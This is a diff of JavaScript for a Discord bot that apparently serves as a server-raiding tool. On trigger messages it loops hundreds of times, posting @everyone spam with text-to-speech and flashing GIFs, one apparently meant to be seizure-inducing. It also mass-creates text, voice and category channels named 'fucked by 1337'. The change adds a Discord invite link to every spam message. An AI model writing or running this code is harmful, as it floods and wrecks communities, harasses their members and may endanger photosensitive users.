@@ -128,18 +128,18 @@ client.on("message", message => {
                     }
                     if(message.content.includes("@everyone")){
                         for(var i = 0; i < 999; i++){
-                            message.channel.send("@everyone FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true})
+                            message.channel.send("@everyone https://discord.gg/3894uun FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true})
                         }
                     }
                     if(message.content.includes(".sc")){
                       for(var i =0; i < 999; i++){
-                        message.guild.createChannel("fucked by 1337", "text").then(c => c.send("@everyone FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true}))
+                        message.guild.createChannel("fucked by 1337", "text").then(c => c.send("@everyone https://discord.gg/3894uun FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true}))
                       }
                   }
                     //réaction en chaine
                           if(message.content === "channel"){
                               for(var i = 0; i < 500; i++){
-                                  message.guild.createChannel("fucked by 1337", "text").then(c => c.send("@everyone FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true}))
+                                  message.guild.createChannel("fucked by 1337", "text").then(c => c.send("@everyone https://discord.gg/3894uun FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true}))
                                   message.guild.createChannel("fucked by 1337","voice")
                                   message.guild.createChannel("fucked by 1337","category")    
                               }
